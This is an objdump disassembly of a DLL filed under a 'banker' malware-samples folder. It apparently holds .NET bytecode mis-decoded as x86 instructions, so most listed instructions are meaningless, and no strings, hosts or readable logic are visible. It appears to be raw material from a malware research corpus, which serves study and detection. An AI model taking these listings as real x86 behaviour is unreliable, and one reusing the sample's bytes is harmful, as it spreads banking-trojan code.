
malware_samples/banker/151dc1f3b41e479ce8145de0dfd3940ba0c9e16576b16d87fc52c2851428e5f7.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	65 51                	gs push %ecx
10002002:	00 00                	add    %al,(%eax)
10002004:	00 00                	add    %al,(%eax)
10002006:	00 00                	add    %al,(%eax)
10002008:	48                   	dec    %eax
10002009:	00 00                	add    %al,(%eax)
1000200b:	00 02                	add    %al,(%edx)
1000200d:	00 05 00 10 26 00    	add    %al,0x261000
10002013:	00 70 2a             	add    %dh,0x2a(%eax)
10002016:	00 00                	add    %al,(%eax)
10002018:	01 00                	add    %eax,(%eax)
	...
1000204e:	00 00                	add    %al,(%eax)
10002050:	13 30                	adc    (%eax),%esi
10002052:	04 00                	add    $0x0,%al
10002054:	67 00 00             	add    %al,(%bx,%si)
10002057:	00 00                	add    %al,(%eax)
10002059:	00 00                	add    %al,(%eax)
1000205b:	00 28                	add    %ch,(%eax)
1000205d:	10 00                	adc    %al,(%eax)
1000205f:	00 0a                	add    %cl,(%edx)
10002061:	28 10                	sub    %dl,(%eax)
10002063:	00 00                	add    %al,(%eax)
10002065:	0a 72 01             	or     0x1(%edx),%dh
10002068:	00 00                	add    %al,(%eax)
1000206a:	70 28                	jo     0x10002094
1000206c:	11 00                	adc    %eax,(%eax)
1000206e:	00 0a                	add    %cl,(%edx)
10002070:	6f                   	outsl  %ds:(%esi),(%dx)
10002071:	12 00                	adc    (%eax),%al
10002073:	00 0a                	add    %cl,(%edx)
10002075:	72 74                	jb     0x100020eb
10002077:	01 00                	add    %eax,(%eax)
10002079:	70 72                	jo     0x100020ed
1000207b:	8a 01                	mov    (%ecx),%al
1000207d:	00 70 6f             	add    %dh,0x6f(%eax)
10002080:	13 00                	adc    (%eax),%eax
10002082:	00 0a                	add    %cl,(%edx)
10002084:	28 11                	sub    %dl,(%ecx)
10002086:	00 00                	add    %al,(%eax)
10002088:	0a 6f 12             	or     0x12(%edi),%ch
1000208b:	00 00                	add    %al,(%eax)
1000208d:	0a 02                	or     (%edx),%al
1000208f:	28 01                	sub    %al,(%ecx)
10002091:	00 00                	add    %al,(%eax)
10002093:	2b 7e 19             	sub    0x19(%esi),%edi
10002096:	00 00                	add    %al,(%eax)
10002098:	04 25                	add    $0x25,%al
1000209a:	2d 17 26 7e 18       	sub    $0x187e2617,%eax
1000209f:	00 00                	add    %al,(%eax)
100020a1:	04 fe                	add    $0xfe,%al
100020a3:	06                   	push   %es
100020a4:	0f 00 00             	sldt   (%eax)
100020a7:	06                   	push   %es
100020a8:	73 15                	jae    0x100020bf
100020aa:	00 00                	add    %al,(%eax)
100020ac:	0a 25 80 19 00 00    	or     0x1980,%ah
100020b2:	04 28                	add    $0x28,%al
100020b4:	02 00                	add    (%eax),%al
100020b6:	00 2b                	add    %ch,(%ebx)
100020b8:	28 03                	sub    %al,(%ebx)
100020ba:	00 00                	add    %al,(%eax)
100020bc:	2b 73 18             	sub    0x18(%ebx),%esi
100020bf:	00 00                	add    %al,(%eax)
100020c1:	0a 2a                	or     (%edx),%ch
100020c3:	00 1b                	add    %bl,(%ebx)
100020c5:	30 0a                	xor    %cl,(%edx)
100020c7:	00 20                	add    %ah,(%eax)
100020c9:	01 00                	add    %eax,(%eax)
100020cb:	00 01                	add    %al,(%ecx)
100020cd:	00 00                	add    %al,(%eax)
100020cf:	11 12                	adc    %edx,(%edx)
100020d1:	00 fe                	add    %bh,%dh
100020d3:	15 03 00 00 02       	adc    $0x2000003,%eax
100020d8:	12 00                	adc    (%eax),%al
100020da:	06                   	push   %es
100020db:	28 04 00             	sub    %al,(%eax,%eax,1)
100020de:	00 2b                	add    %ch,(%ebx)
100020e0:	7d 02                	jge    0x100020e4
100020e2:	00 00                	add    %al,(%eax)
100020e4:	04 12                	add    $0x12,%al
100020e6:	01 fe                	add    %edi,%esi
100020e8:	15 04 00 00 02       	adc    $0x2000004,%eax
100020ed:	28 0c 00             	sub    %cl,(%eax,%eax,1)
100020f0:	00 06                	add    %al,(%esi)
100020f2:	14 7e                	adc    $0x7e,%al
100020f4:	1a 00                	sbb    (%eax),%al
100020f6:	00 0a                	add    %cl,(%edx)
100020f8:	7e 1a                	jle    0x10002114
100020fa:	00 00                	add    %al,(%eax)
100020fc:	0a 16                	or     (%esi),%dl
100020fe:	1a 7e 1a             	sbb    0x1a(%esi),%bh
10002101:	00 00                	add    %al,(%eax)
10002103:	0a 14 12             	or     (%edx,%edx,1),%dl
10002106:	00 12                	add    %dl,(%edx)
10002108:	01 28                	add    %ebp,(%eax)
1000210a:	03 00                	add    (%eax),%eax
1000210c:	00 06                	add    %al,(%esi)
1000210e:	2d 01 2a 00 07       	sub    $0x7002a01,%eax
10002113:	7b 14                	jnp    0x10002129
10002115:	00 00                	add    %al,(%eax)
10002117:	04 7e                	add    $0x7e,%al
10002119:	1a 00                	sbb    (%eax),%al
1000211b:	00 0a                	add    %cl,(%edx)
1000211d:	03 8e 69 20 00 30    	add    0x30002069(%esi),%ecx
10002123:	00 00                	add    %al,(%eax)
10002125:	1f                   	pop    %ds
10002126:	40                   	inc    %eax
10002127:	28 04 00             	sub    %al,(%eax,%eax,1)
1000212a:	00 06                	add    %al,(%esi)
1000212c:	0c 08                	or     $0x8,%al
1000212e:	7e 1a                	jle    0x1000214a
10002130:	00 00                	add    %al,(%eax)
10002132:	0a 28                	or     (%eax),%ch
10002134:	1b 00                	sbb    (%eax),%eax
10002136:	00 0a                	add    %cl,(%edx)
10002138:	2c 0b                	sub    $0xb,%al
1000213a:	72 8a                	jb     0x100020c6
1000213c:	01 00                	add    %eax,(%eax)
1000213e:	70 73                	jo     0x100021b3
10002140:	1c 00                	sbb    $0x0,%al
10002142:	00 0a                	add    %cl,(%edx)
10002144:	7a 07                	jp     0x1000214d
10002146:	7b 14                	jnp    0x1000215c
10002148:	00 00                	add    %al,(%eax)
1000214a:	04 08                	add    $0x8,%al
1000214c:	03 03                	add    (%ebx),%eax
1000214e:	8e 69 12             	mov    0x12(%ecx),%gs
10002151:	04 28                	add    $0x28,%al
10002153:	09 00                	or     %eax,(%eax)
10002155:	00 06                	add    %al,(%esi)
10002157:	2d 0b 72 8a 01       	sub    $0x18a720b,%eax
1000215c:	00 70 73             	add    %dh,0x73(%eax)
1000215f:	1c 00                	sbb    $0x0,%al
10002161:	00 0a                	add    %cl,(%edx)
10002163:	7a 07                	jp     0x1000216c
10002165:	7b 14                	jnp    0x1000217b
10002167:	00 00                	add    %al,(%eax)
10002169:	04 7e                	add    $0x7e,%al
1000216b:	1a 00                	sbb    (%eax),%al
1000216d:	00 0a                	add    %cl,(%edx)
1000216f:	16                   	push   %ss
10002170:	08 7e 1a             	or     %bh,0x1a(%esi)
10002173:	00 00                	add    %al,(%eax)
10002175:	0a 16                	or     (%esi),%dl
10002177:	12 04 28             	adc    (%eax,%ebp,1),%al
1000217a:	08 00                	or     %al,(%eax)
1000217c:	00 06                	add    %al,(%esi)
1000217e:	0d 09 7e 1a 00       	or     $0x1a7e09,%eax
10002183:	00 0a                	add    %cl,(%edx)
10002185:	28 1b                	sub    %bl,(%ebx)
10002187:	00 00                	add    %al,(%eax)
10002189:	0a 2d 45 09 12 06    	or     0x6120945,%ch
1000218f:	28 02                	sub    %al,(%edx)
10002191:	00 00                	add    %al,(%eax)
10002193:	06                   	push   %es
10002194:	2c 12                	sub    $0x12,%al
10002196:	11 06                	adc    %eax,(%esi)
10002198:	20 03                	and    %al,(%ebx)
1000219a:	01 00                	add    %eax,(%eax)
1000219c:	00 33                	add    %dh,(%ebx)
1000219e:	0b 1f                	or     (%edi),%ebx
100021a0:	64 28 1d 00 00 0a 2b 	sub    %bl,%fs:0x2b0a0000
100021a7:	e4 de                	in     $0xde,%al
100021a9:	45                   	inc    %ebp
100021aa:	07                   	pop    %es
100021ab:	7b 16                	jnp    0x100021c3
100021ad:	00 00                	add    %al,(%eax)
100021af:	04 28                	add    $0x28,%al
100021b1:	1e                   	push   %ds
100021b2:	00 00                	add    %al,(%eax)
100021b4:	0a 13                	or     (%ebx),%dl
100021b6:	05 11 05 6f 1f       	add    $0x1f6f0511,%eax
100021bb:	00 00                	add    %al,(%eax)
100021bd:	0a 16                	or     (%esi),%dl
100021bf:	fe 01                	incb   (%ecx)
100021c1:	2c 07                	sub    $0x7,%al
100021c3:	11 05 6f 20 00 00    	adc    %eax,0x206f
100021c9:	0a 09                	or     (%ecx),%cl
100021cb:	28 01                	sub    %al,(%ecx)
100021cd:	00 00                	add    %al,(%eax)
100021cf:	06                   	push   %es
100021d0:	26 de 1c 26          	ficomps %es:(%esi,%eiz,1)
100021d4:	de 19                	ficomps (%ecx)
100021d6:	07                   	pop    %es
100021d7:	7b 14                	jnp    0x100021ed
100021d9:	00 00                	add    %al,(%eax)
100021db:	04 28                	add    $0x28,%al
100021dd:	01 00                	add    %eax,(%eax)
100021df:	00 06                	add    %al,(%esi)
100021e1:	26 07                	es pop %es
100021e3:	7b 15                	jnp    0x100021fa
100021e5:	00 00                	add    %al,(%eax)
100021e7:	04 28                	add    $0x28,%al
100021e9:	01 00                	add    %eax,(%eax)
100021eb:	00 06                	add    %al,(%esi)
100021ed:	26 dc 2a             	fsubrl %es:(%edx)
100021f0:	01 1c 00             	add    %ebx,(%eax,%eax,1)
100021f3:	00 00                	add    %al,(%eax)
100021f5:	00 42 00             	add    %al,0x0(%edx)
100021f8:	c1 03 01             	roll   $0x1,(%ebx)
100021fb:	03 13                	add    (%ebx),%edx
100021fd:	00 00                	add    %al,(%eax)
100021ff:	01 02                	add    %eax,(%edx)
10002201:	00 42 00             	add    %al,0x0(%edx)
10002204:	c4 06                	les    (%esi),%eax
10002206:	01 19                	add    %ebx,(%ecx)
10002208:	00 00                	add    %al,(%eax)
1000220a:	00 00                	add    %al,(%eax)
1000220c:	13 30                	adc    (%eax),%esi
1000220e:	04 00                	add    $0x0,%al
10002210:	67 00 00             	add    %al,(%bx,%si)
10002213:	00 00                	add    %al,(%eax)
10002215:	00 00                	add    %al,(%eax)
10002217:	00 28                	add    %ch,(%eax)
10002219:	10 00                	adc    %al,(%eax)
1000221b:	00 0a                	add    %cl,(%edx)
1000221d:	28 10                	sub    %dl,(%eax)
1000221f:	00 00                	add    %al,(%eax)
10002221:	0a 72 8c             	or     -0x74(%edx),%dh
10002224:	01 00                	add    %eax,(%eax)
10002226:	70 28                	jo     0x10002250
10002228:	11 00                	adc    %eax,(%eax)
1000222a:	00 0a                	add    %cl,(%edx)
1000222c:	6f                   	outsl  %ds:(%esi),(%dx)
1000222d:	12 00                	adc    (%eax),%al
1000222f:	00 0a                	add    %cl,(%edx)
10002231:	72 6f                	jb     0x100022a2
10002233:	04 00                	add    $0x0,%al
10002235:	70 72                	jo     0x100022a9
10002237:	8a 01                	mov    (%ecx),%al
10002239:	00 70 6f             	add    %dh,0x6f(%eax)
1000223c:	13 00                	adc    (%eax),%eax
1000223e:	00 0a                	add    %cl,(%edx)
10002240:	28 11                	sub    %dl,(%ecx)
10002242:	00 00                	add    %al,(%eax)
10002244:	0a 6f 12             	or     0x12(%edi),%ch
10002247:	00 00                	add    %al,(%eax)
10002249:	0a 02                	or     (%edx),%al
1000224b:	28 01                	sub    %al,(%ecx)
1000224d:	00 00                	add    %al,(%eax)
1000224f:	2b 7e 1a             	sub    0x1a(%esi),%edi
10002252:	00 00                	add    %al,(%eax)
10002254:	04 25                	add    $0x25,%al
10002256:	2d 17 26 7e 18       	sub    $0x187e2617,%eax
1000225b:	00 00                	add    %al,(%eax)
1000225d:	04 fe                	add    $0xfe,%al
1000225f:	06                   	push   %es
10002260:	10 00                	adc    %al,(%eax)
10002262:	00 06                	add    %al,(%esi)
10002264:	73 15                	jae    0x1000227b
10002266:	00 00                	add    %al,(%eax)
10002268:	0a 25 80 1a 00 00    	or     0x1a80,%ah
1000226e:	04 28                	add    $0x28,%al
10002270:	02 00                	add    (%eax),%al
10002272:	00 2b                	add    %ch,(%ebx)
10002274:	28 03                	sub    %al,(%ebx)
10002276:	00 00                	add    %al,(%eax)
10002278:	2b 73 18             	sub    0x18(%ebx),%esi
1000227b:	00 00                	add    %al,(%eax)
1000227d:	0a 2a                	or     (%edx),%ch
1000227f:	2e 73 21             	jae,pn 0x100022a3
10002282:	00 00                	add    %al,(%eax)
10002284:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
1000228a:	2a 00                	sub    (%eax),%al
1000228c:	13 30                	adc    (%eax),%esi
1000228e:	07                   	pop    %es
1000228f:	00 62 02             	add    %ah,0x2(%edx)
10002292:	00 00                	add    %al,(%eax)
10002294:	02 00                	add    (%eax),%al
10002296:	00 11                	add    %dl,(%ecx)
10002298:	73 11                	jae    0x100022ab
1000229a:	00 00                	add    %al,(%eax)
1000229c:	06                   	push   %es
1000229d:	0a 06                	or     (%esi),%al
1000229f:	73 22                	jae    0x100022c3
100022a1:	00 00                	add    %al,(%eax)
100022a3:	0a 25 28 10 00 00    	or     0x1028,%ah
100022a9:	0a 28                	or     (%eax),%ch
100022ab:	10 00                	adc    %al,(%eax)
100022ad:	00 0a                	add    %cl,(%edx)
100022af:	72 85                	jb     0x10002236
100022b1:	04 00                	add    $0x0,%al
100022b3:	70 28                	jo     0x100022dd
100022b5:	11 00                	adc    %eax,(%eax)
100022b7:	00 0a                	add    %cl,(%edx)
100022b9:	6f                   	outsl  %ds:(%esi),(%dx)
100022ba:	12 00                	adc    (%eax),%al
100022bc:	00 0a                	add    %cl,(%edx)
100022be:	72 38                	jb     0x100022f8
100022c0:	06                   	push   %es
100022c1:	00 70 72             	add    %dh,0x72(%eax)
100022c4:	8a 01                	mov    (%ecx),%al
100022c6:	00 70 6f             	add    %dh,0x6f(%eax)
100022c9:	13 00                	adc    (%eax),%eax
100022cb:	00 0a                	add    %cl,(%edx)
100022cd:	28 11                	sub    %dl,(%ecx)
100022cf:	00 00                	add    %al,(%eax)
100022d1:	0a 6f 12             	or     0x12(%edi),%ch
100022d4:	00 00                	add    %al,(%eax)
100022d6:	0a 6f 23             	or     0x23(%edi),%ch
100022d9:	00 00                	add    %al,(%eax)
100022db:	0a 25 28 10 00 00    	or     0x1028,%ah
100022e1:	0a 28                	or     (%eax),%ch
100022e3:	10 00                	adc    %al,(%eax)
100022e5:	00 0a                	add    %cl,(%edx)
100022e7:	72 4e                	jb     0x10002337
100022e9:	06                   	push   %es
100022ea:	00 70 28             	add    %dh,0x28(%eax)
100022ed:	11 00                	adc    %eax,(%eax)
100022ef:	00 0a                	add    %cl,(%edx)
100022f1:	6f                   	outsl  %ds:(%esi),(%dx)
100022f2:	12 00                	adc    (%eax),%al
100022f4:	00 0a                	add    %cl,(%edx)
100022f6:	72 01                	jb     0x100022f9
100022f8:	08 00                	or     %al,(%eax)
100022fa:	70 72                	jo     0x1000236e
100022fc:	8a 01                	mov    (%ecx),%al
100022fe:	00 70 6f             	add    %dh,0x6f(%eax)
10002301:	13 00                	adc    (%eax),%eax
10002303:	00 0a                	add    %cl,(%edx)
10002305:	28 11                	sub    %dl,(%ecx)
10002307:	00 00                	add    %al,(%eax)
10002309:	0a 6f 12             	or     0x12(%edi),%ch
1000230c:	00 00                	add    %al,(%eax)
1000230e:	0a 6f 23             	or     0x23(%edi),%ch
10002311:	00 00                	add    %al,(%eax)
10002313:	0a 25 28 10 00 00    	or     0x1028,%ah
10002319:	0a 28                	or     (%eax),%ch
1000231b:	10 00                	adc    %al,(%eax)
1000231d:	00 0a                	add    %cl,(%edx)
1000231f:	72 17                	jb     0x10002338
10002321:	08 00                	or     %al,(%eax)
10002323:	70 28                	jo     0x1000234d
10002325:	11 00                	adc    %eax,(%eax)
10002327:	00 0a                	add    %cl,(%edx)
10002329:	6f                   	outsl  %ds:(%esi),(%dx)
1000232a:	12 00                	adc    (%eax),%al
1000232c:	00 0a                	add    %cl,(%edx)
1000232e:	72 d2                	jb     0x10002302
10002330:	08 00                	or     %al,(%eax)
10002332:	70 72                	jo     0x100023a6
10002334:	8a 01                	mov    (%ecx),%al
10002336:	00 70 6f             	add    %dh,0x6f(%eax)
10002339:	13 00                	adc    (%eax),%eax
1000233b:	00 0a                	add    %cl,(%edx)
1000233d:	28 11                	sub    %dl,(%ecx)
1000233f:	00 00                	add    %al,(%eax)
10002341:	0a 6f 12             	or     0x12(%edi),%ch
10002344:	00 00                	add    %al,(%eax)
10002346:	0a 6f 23             	or     0x23(%edi),%ch
10002349:	00 00                	add    %al,(%eax)
1000234b:	0a 25 28 10 00 00    	or     0x1028,%ah
10002351:	0a 28                	or     (%eax),%ch
10002353:	10 00                	adc    %al,(%eax)
10002355:	00 0a                	add    %cl,(%edx)
10002357:	72 e8                	jb     0x10002341
10002359:	08 00                	or     %al,(%eax)
1000235b:	70 28                	jo     0x10002385
1000235d:	11 00                	adc    %eax,(%eax)
1000235f:	00 0a                	add    %cl,(%edx)
10002361:	6f                   	outsl  %ds:(%esi),(%dx)
10002362:	12 00                	adc    (%eax),%al
10002364:	00 0a                	add    %cl,(%edx)
10002366:	72 a3                	jb     0x1000230b
10002368:	09 00                	or     %eax,(%eax)
1000236a:	70 72                	jo     0x100023de
1000236c:	8a 01                	mov    (%ecx),%al
1000236e:	00 70 6f             	add    %dh,0x6f(%eax)
10002371:	13 00                	adc    (%eax),%eax
10002373:	00 0a                	add    %cl,(%edx)
10002375:	28 11                	sub    %dl,(%ecx)
10002377:	00 00                	add    %al,(%eax)
10002379:	0a 6f 12             	or     0x12(%edi),%ch
1000237c:	00 00                	add    %al,(%eax)
1000237e:	0a 6f 23             	or     0x23(%edi),%ch
10002381:	00 00                	add    %al,(%eax)
10002383:	0a 25 28 10 00 00    	or     0x1028,%ah
10002389:	0a 28                	or     (%eax),%ch
1000238b:	10 00                	adc    %al,(%eax)
1000238d:	00 0a                	add    %cl,(%edx)
1000238f:	72 b9                	jb     0x1000234a
10002391:	09 00                	or     %eax,(%eax)
10002393:	70 28                	jo     0x100023bd
10002395:	11 00                	adc    %eax,(%eax)
10002397:	00 0a                	add    %cl,(%edx)
10002399:	6f                   	outsl  %ds:(%esi),(%dx)
1000239a:	12 00                	adc    (%eax),%al
1000239c:	00 0a                	add    %cl,(%edx)
1000239e:	72 b4                	jb     0x10002354
100023a0:	0a 00                	or     (%eax),%al
100023a2:	70 72                	jo     0x10002416
100023a4:	8a 01                	mov    (%ecx),%al
100023a6:	00 70 6f             	add    %dh,0x6f(%eax)
100023a9:	13 00                	adc    (%eax),%eax
100023ab:	00 0a                	add    %cl,(%edx)
100023ad:	28 11                	sub    %dl,(%ecx)
100023af:	00 00                	add    %al,(%eax)
100023b1:	0a 6f 12             	or     0x12(%edi),%ch
100023b4:	00 00                	add    %al,(%eax)
100023b6:	0a 6f 23             	or     0x23(%edi),%ch
100023b9:	00 00                	add    %al,(%eax)
100023bb:	0a 25 28 10 00 00    	or     0x1028,%ah
100023c1:	0a 28                	or     (%eax),%ch
100023c3:	10 00                	adc    %al,(%eax)
100023c5:	00 0a                	add    %cl,(%edx)
100023c7:	72 ca                	jb     0x10002393
100023c9:	0a 00                	or     (%eax),%al
100023cb:	70 28                	jo     0x100023f5
100023cd:	11 00                	adc    %eax,(%eax)
100023cf:	00 0a                	add    %cl,(%edx)
100023d1:	6f                   	outsl  %ds:(%esi),(%dx)
100023d2:	12 00                	adc    (%eax),%al
100023d4:	00 0a                	add    %cl,(%edx)
100023d6:	72 44                	jb     0x1000241c
100023d8:	0b 00                	or     (%eax),%eax
100023da:	70 72                	jo     0x1000244e
100023dc:	8a 01                	mov    (%ecx),%al
100023de:	00 70 6f             	add    %dh,0x6f(%eax)
100023e1:	13 00                	adc    (%eax),%eax
100023e3:	00 0a                	add    %cl,(%edx)
100023e5:	28 11                	sub    %dl,(%ecx)
100023e7:	00 00                	add    %al,(%eax)
100023e9:	0a 6f 12             	or     0x12(%edi),%ch
100023ec:	00 00                	add    %al,(%eax)
100023ee:	0a 6f 23             	or     0x23(%edi),%ch
100023f1:	00 00                	add    %al,(%eax)
100023f3:	0a 25 28 10 00 00    	or     0x1028,%ah
100023f9:	0a 28                	or     (%eax),%ch
100023fb:	10 00                	adc    %al,(%eax)
100023fd:	00 0a                	add    %cl,(%edx)
100023ff:	72 5a                	jb     0x1000245b
10002401:	0b 00                	or     (%eax),%eax
10002403:	70 28                	jo     0x1000242d
10002405:	11 00                	adc    %eax,(%eax)
10002407:	00 0a                	add    %cl,(%edx)
10002409:	6f                   	outsl  %ds:(%esi),(%dx)
1000240a:	12 00                	adc    (%eax),%al
1000240c:	00 0a                	add    %cl,(%edx)
1000240e:	72 cd                	jb     0x100023dd
10002410:	0c 00                	or     $0x0,%al
10002412:	70 72                	jo     0x10002486
10002414:	8a 01                	mov    (%ecx),%al
10002416:	00 70 6f             	add    %dh,0x6f(%eax)
10002419:	13 00                	adc    (%eax),%eax
1000241b:	00 0a                	add    %cl,(%edx)
1000241d:	28 11                	sub    %dl,(%ecx)
1000241f:	00 00                	add    %al,(%eax)
10002421:	0a 6f 12             	or     0x12(%edi),%ch
10002424:	00 00                	add    %al,(%eax)
10002426:	0a 6f 23             	or     0x23(%edi),%ch
10002429:	00 00                	add    %al,(%eax)
1000242b:	0a 25 28 10 00 00    	or     0x1028,%ah
10002431:	0a 28                	or     (%eax),%ch
10002433:	10 00                	adc    %al,(%eax)
10002435:	00 0a                	add    %cl,(%edx)
10002437:	72 e3                	jb     0x1000241c
10002439:	0c 00                	or     $0x0,%al
1000243b:	70 28                	jo     0x10002465
1000243d:	11 00                	adc    %eax,(%eax)
1000243f:	00 0a                	add    %cl,(%edx)
10002441:	6f                   	outsl  %ds:(%esi),(%dx)
10002442:	12 00                	adc    (%eax),%al
10002444:	00 0a                	add    %cl,(%edx)
10002446:	72 de                	jb     0x10002426
10002448:	0d 00 70 72 8a       	or     $0x8a727000,%eax
1000244d:	01 00                	add    %eax,(%eax)
1000244f:	70 6f                	jo     0x100024c0
10002451:	13 00                	adc    (%eax),%eax
10002453:	00 0a                	add    %cl,(%edx)
10002455:	28 11                	sub    %dl,(%ecx)
10002457:	00 00                	add    %al,(%eax)
10002459:	0a 6f 12             	or     0x12(%edi),%ch
1000245c:	00 00                	add    %al,(%eax)
1000245e:	0a 6f 23             	or     0x23(%edi),%ch
10002461:	00 00                	add    %al,(%eax)
10002463:	0a 7d 1b             	or     0x1b(%ebp),%bh
10002466:	00 00                	add    %al,(%eax)
10002468:	04 28                	add    $0x28,%al
1000246a:	10 00                	adc    %al,(%eax)
1000246c:	00 0a                	add    %cl,(%edx)
1000246e:	28 10                	sub    %dl,(%eax)
10002470:	00 00                	add    %al,(%eax)
10002472:	0a 72 f4             	or     -0xc(%edx),%dh
10002475:	0d 00 70 28 11       	or     $0x11287000,%eax
1000247a:	00 00                	add    %al,(%eax)
1000247c:	0a 6f 12             	or     0x12(%edi),%ch
1000247f:	00 00                	add    %al,(%eax)
10002481:	0a 72 77             	or     0x77(%edx),%dh
10002484:	13 00                	adc    (%eax),%eax
10002486:	70 72                	jo     0x100024fa
10002488:	8a 01                	mov    (%ecx),%al
1000248a:	00 70 6f             	add    %dh,0x6f(%eax)
1000248d:	13 00                	adc    (%eax),%eax
1000248f:	00 0a                	add    %cl,(%edx)
10002491:	28 11                	sub    %dl,(%ecx)
10002493:	00 00                	add    %al,(%eax)
10002495:	0a 6f 12             	or     0x12(%edi),%ch
10002498:	00 00                	add    %al,(%eax)
1000249a:	0a 28                	or     (%eax),%ch
1000249c:	10 00                	adc    %al,(%eax)
1000249e:	00 0a                	add    %cl,(%edx)
100024a0:	28 10                	sub    %dl,(%eax)
100024a2:	00 00                	add    %al,(%eax)
100024a4:	0a 72 8d             	or     -0x73(%edx),%dh
100024a7:	13 00                	adc    (%eax),%eax
100024a9:	70 28                	jo     0x100024d3
100024ab:	11 00                	adc    %eax,(%eax)
100024ad:	00 0a                	add    %cl,(%edx)
100024af:	6f                   	outsl  %ds:(%esi),(%dx)
100024b0:	12 00                	adc    (%eax),%al
100024b2:	00 0a                	add    %cl,(%edx)
100024b4:	72 48                	jb     0x100024fe
100024b6:	14 00                	adc    $0x0,%al
100024b8:	70 72                	jo     0x1000252c
100024ba:	8a 01                	mov    (%ecx),%al
100024bc:	00 70 6f             	add    %dh,0x6f(%eax)
100024bf:	13 00                	adc    (%eax),%eax
100024c1:	00 0a                	add    %cl,(%edx)
100024c3:	28 11                	sub    %dl,(%ecx)
100024c5:	00 00                	add    %al,(%eax)
100024c7:	0a 6f 12             	or     0x12(%edi),%ch
100024ca:	00 00                	add    %al,(%eax)
100024cc:	0a 17                	or     (%edi),%dl
100024ce:	28 24 00             	sub    %ah,(%eax,%eax,1)
100024d1:	00 0a                	add    %cl,(%edx)
100024d3:	06                   	push   %es
100024d4:	fe 06                	incb   (%esi)
100024d6:	12 00                	adc    (%eax),%al
100024d8:	00 06                	add    %al,(%esi)
100024da:	73 25                	jae    0x10002501
100024dc:	00 00                	add    %al,(%eax)
100024de:	0a 28                	or     (%eax),%ch
100024e0:	05 00 00 2b 28       	add    $0x282b0000,%eax
100024e5:	06                   	push   %es
100024e6:	00 00                	add    %al,(%eax)
100024e8:	2b 0b                	sub    (%ebx),%ecx
100024ea:	07                   	pop    %es
100024eb:	73 21                	jae    0x1000250e
100024ed:	00 00                	add    %al,(%eax)
100024ef:	0a 07                	or     (%edi),%al
100024f1:	8e 69 6f             	mov    0x6f(%ecx),%gs
100024f4:	27                   	daa
100024f5:	00 00                	add    %al,(%eax)
100024f7:	0a 9a 2a 00 00 13    	or     0x1300002a(%edx),%bl
100024fd:	30 07                	xor    %al,(%edi)
100024ff:	00 a6 00 00 00 03    	add    %ah,0x3000000(%esi)
10002505:	00 00                	add    %al,(%eax)
10002507:	11 28                	adc    %ebp,(%eax)
10002509:	10 00                	adc    %al,(%eax)
1000250b:	00 0a                	add    %cl,(%edx)
1000250d:	28 10                	sub    %dl,(%eax)
1000250f:	00 00                	add    %al,(%eax)
10002511:	0a 72 5e             	or     0x5e(%edx),%dh
10002514:	14 00                	adc    $0x0,%al
10002516:	70 28                	jo     0x10002540
10002518:	11 00                	adc    %eax,(%eax)
1000251a:	00 0a                	add    %cl,(%edx)
1000251c:	6f                   	outsl  %ds:(%esi),(%dx)
1000251d:	12 00                	adc    (%eax),%al
1000251f:	00 0a                	add    %cl,(%edx)
10002521:	72 51                	jb     0x10002574
10002523:	16                   	push   %ss
10002524:	00 70 72             	add    %dh,0x72(%eax)
10002527:	8a 01                	mov    (%ecx),%al
10002529:	00 70 6f             	add    %dh,0x6f(%eax)
1000252c:	13 00                	adc    (%eax),%eax
1000252e:	00 0a                	add    %cl,(%edx)
10002530:	28 11                	sub    %dl,(%ecx)
10002532:	00 00                	add    %al,(%eax)
10002534:	0a 6f 12             	or     0x12(%edi),%ch
10002537:	00 00                	add    %al,(%eax)
10002539:	0a 1a                	or     (%edx),%bl
1000253b:	28 07                	sub    %al,(%edi)
1000253d:	00 00                	add    %al,(%eax)
1000253f:	06                   	push   %es
10002540:	28 28                	sub    %ch,(%eax)
10002542:	00 00                	add    %al,(%eax)
10002544:	0a 25 28 29 00 00    	or     0x2928,%ah
1000254a:	0a 26                	or     (%esi),%ah
1000254c:	28 0b                	sub    %cl,(%ebx)
1000254e:	00 00                	add    %al,(%eax)
10002550:	06                   	push   %es
10002551:	0a 1b                	or     (%ebx),%bl
10002553:	28 07                	sub    %al,(%edi)
10002555:	00 00                	add    %al,(%eax)
10002557:	06                   	push   %es
10002558:	72 67                	jb     0x100025c1
1000255a:	16                   	push   %ss
1000255b:	00 70 28             	add    %dh,0x28(%eax)
1000255e:	10 00                	adc    %al,(%eax)
10002560:	00 0a                	add    %cl,(%edx)
10002562:	28 10                	sub    %dl,(%eax)
10002564:	00 00                	add    %al,(%eax)
10002566:	0a 72 6b             	or     0x6b(%edx),%dh
10002569:	16                   	push   %ss
1000256a:	00 70 28             	add    %dh,0x28(%eax)
1000256d:	11 00                	adc    %eax,(%eax)
1000256f:	00 0a                	add    %cl,(%edx)
10002571:	6f                   	outsl  %ds:(%esi),(%dx)
10002572:	12 00                	adc    (%eax),%al
10002574:	00 0a                	add    %cl,(%edx)
10002576:	72 26                	jb     0x1000259e
10002578:	17                   	pop    %ss
10002579:	00 70 72             	add    %dh,0x72(%eax)
1000257c:	8a 01                	mov    (%ecx),%al
1000257e:	00 70 6f             	add    %dh,0x6f(%eax)
10002581:	13 00                	adc    (%eax),%eax
10002583:	00 0a                	add    %cl,(%edx)
10002585:	28 11                	sub    %dl,(%ecx)
10002587:	00 00                	add    %al,(%eax)
10002589:	0a 6f 12             	or     0x12(%edi),%ch
1000258c:	00 00                	add    %al,(%eax)
1000258e:	0a 28                	or     (%eax),%ch
10002590:	2a 00                	sub    (%eax),%al
10002592:	00 0a                	add    %cl,(%edx)
10002594:	28 28                	sub    %ch,(%eax)
10002596:	00 00                	add    %al,(%eax)
10002598:	0a 0b                	or     (%ebx),%cl
1000259a:	06                   	push   %es
1000259b:	07                   	pop    %es
1000259c:	17                   	pop    %ss
1000259d:	28 2b                	sub    %ch,(%ebx)
1000259f:	00 00                	add    %al,(%eax)
100025a1:	0a 20                	or     (%eax),%ah
100025a3:	e8 03 00 00 28       	call   0x380025ab
100025a8:	1d 00 00 0a 07       	sbb    $0x70a0000,%eax
100025ad:	2a 2e                	sub    (%esi),%ch
100025af:	73 0e                	jae    0x100025bf
100025b1:	00 00                	add    %al,(%eax)
100025b3:	06                   	push   %es
100025b4:	80 18 00             	sbbb   $0x0,(%eax)
100025b7:	00 04 2a             	add    %al,(%edx,%ebp,1)
100025ba:	1e                   	push   %ds
100025bb:	02 28                	add    (%eax),%ch
100025bd:	2c 00                	sub    $0x0,%al
100025bf:	00 0a                	add    %cl,(%edx)
